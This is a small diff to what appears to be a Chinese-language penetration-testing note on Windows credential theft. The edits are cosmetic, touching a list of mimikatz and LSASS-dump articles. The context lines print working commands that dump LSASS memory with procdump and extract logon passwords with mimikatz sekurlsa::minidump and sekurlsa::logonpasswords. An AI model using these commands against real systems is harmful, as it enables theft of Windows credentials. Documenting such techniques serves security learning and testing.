@@ -133,7 +133,7 @@ vault::cred /patch
 - [mimikatz-抓取windows明文密码](http://rtshield.top/2019/09/02/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-%E6%8A%93%E5%8F%96windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/)
 - [利用Mimikatz提取虚拟机内存中的密码](https://www.freebuf.com/articles/system/44620.html)
 - [LSASS Memory Dumps are Stealthier than Ever Before](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)
-- [Lsass Memory Dumps are Stealthier than Ever Before – Part 2](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
+- [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
 - [渗透技巧——使用Mimilib从dump文件中导出口令](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8Mimilib%E4%BB%8Edump%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%8F%A3%E4%BB%A4/)
 - [Mimikatz Against Virtual Machine Memory Part 1 Carnal0wnage](https://blog.carnal0wnage.com/2014/05/mimikatz-against-virtual-machine-memory.html)
 - [Mimikatz Against Virtual Machine Memory Part 2 Carnal0wnage](https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html)
@@ -199,11 +199,10 @@ Procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 tasklist /fi "imagename eq lsass.exe"
 procdump -accepteula -ma 640 lsass.dmp
-
 ```
 
 然后用 mimikatz 加载导出来的内存再抓 hash
-```bash
+```
 sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
